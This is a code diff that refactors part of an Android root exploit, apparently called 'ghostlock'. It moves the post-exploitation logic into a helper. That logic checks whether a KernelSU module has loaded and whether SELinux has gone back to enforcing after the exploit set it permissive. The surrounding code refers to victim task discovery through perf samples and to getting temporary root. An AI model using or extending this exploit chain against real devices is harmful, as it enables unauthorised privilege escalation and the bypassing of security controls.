@@ -8,6 +8,7 @@
 #include "common.h"
 #include "routes/route_controller.h"
 #include "profile.h"
+#include "session/handoff_probe.hpp"
 #include "support/native_resource.hpp"
 #include <array>
 #include <ctype.h>
@@ -880,23 +881,6 @@ static void write_root_script(void) {
     pr_info("root script written path=%s bytes=%d\n", g_root_script_path, n);
 }
 
-static int kernelsu_module_loaded(void) {
-    FILE *modules = fopen("/proc/modules", "r");
-    if (!modules) return 0;
-
-    char line[256];
-    int loaded = 0;
-    while (fgets(line, sizeof(line), modules)) {
-        char name[64];
-        if (sscanf(line, "%63s", name) == 1 && strcmp(name, "kernelsu") == 0) {
-            loaded = 1;
-            break;
-        }
-    }
-    fclose(modules);
-    return loaded;
-}
-
 /* Find a task through perf sample records. */
 /* Decoupling plan: discover a victim task address via perf samples. Inputs:
  * VictimContext/profile; output: address/error. Future:
@@ -1732,61 +1716,28 @@ int run_exploit(int argc, char **argv) {
     }
     pipes.uid_read.reset();
 
-    int kernelsu_ready = 0;
-    for (uint32_t i = 0;
-         i < execution_settings()->handoff_module_poll_attempts &&
-                 !(kernelsu_ready = kernelsu_module_loaded()); i++) {
-        usleep(execution_settings()->handoff_module_poll_interval_ms * 1000U);
-    }
-    /* untrusted_app loses /proc/modules once enforcing is restored, so poll
-     * the app-readable log for the loaded-module line (up to ~30s). */
-    int ksu_log_loaded = 0;
-    int ksu_log_failed = 0;
-    for (int i = 0; i < 60 && !(ksu_log_loaded || ksu_log_failed); i++) {
-        char ksu_log_path[320];
-        snprintf(ksu_log_path, sizeof(ksu_log_path), "%s/.ghostlock_ksu.log", g_home_dir);
-        FILE *lf = fopen(ksu_log_path, "r");
-        if (lf) {
-            char line[256];
-            while (fgets(line, sizeof(line), lf)) {
-                if (strstr(line, "[+] KernelSU module loaded") ||
-                        strstr(line, "[+] KernelSU already loaded"))
-                    ksu_log_loaded = 1;
-                if (strstr(line, "[!] KernelSU module not loaded")) ksu_log_failed = 1;
-            }
-            fclose(lf);
-        }
-        if (!(ksu_log_loaded || ksu_log_failed)) usleep(500000);
-    }
-    /* Module init re-enforces at the very end of kernelsu_init; wait up to
-     * 20s for it. Denied read or value 1 both mean enforcing here. */
-    int enforce_ok = 0;
-    for (uint32_t i = 0;
-         ksu_log_loaded && !enforce_ok &&
-                 i < execution_settings()->handoff_enforce_poll_attempts; i++) {
-        int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
-        if (efd < 0) {
-            enforce_ok = 1;
-            break;
-        }
-        char eb[4] = {0};
-        ssize_t rn = read(efd, eb, sizeof(eb));
-        close(efd);
-        if (rn > 0 && eb[0] == '1') enforce_ok = 1;
-        if (!enforce_ok)
-            usleep(execution_settings()->handoff_enforce_poll_interval_ms * 1000U);
-    }
-    if (enforce_ok)
+    ghostlock::HandoffPollPolicy handoff_policy;
+    handoff_policy.module_poll_attempts =
+            execution_settings()->handoff_module_poll_attempts;
+    handoff_policy.module_poll_interval_ms =
+            execution_settings()->handoff_module_poll_interval_ms;
+    handoff_policy.enforce_poll_attempts =
+            execution_settings()->handoff_enforce_poll_attempts;
+    handoff_policy.enforce_poll_interval_ms =
+            execution_settings()->handoff_enforce_poll_interval_ms;
+    const ghostlock::HandoffProbeResult handoff =
+            ghostlock::handoff_probe_run(handoff_policy, g_home_dir);
+    if (handoff.enforce_ok)
         pr_info("enforce=1 (enforcing)\n");
-    else if (ksu_log_loaded)
+    else if (handoff.ksu_log_loaded)
         pr_warning("enforce=0 (still permissive)\n");
-    kernelsu_ready = kernelsu_ready || ksu_log_loaded;
+    const int kernelsu_ready = handoff.ready() ? 1 : 0;
 
     /* Fixup: permissive, load_policy, late-load. Module init re-enforces;
      * policy reload keeps it working after enforcing is back. */
     if (kernelsu_ready)
         pr_success("KernelSU ready\n");
-    else if (ksu_log_failed)
+    else if (handoff.ksu_log_failed)
         pr_warning("KernelSU module load failed\n");
     else if (seccomp_ok)
         pr_warning("temporary root ready; KernelSU module load pending\n");
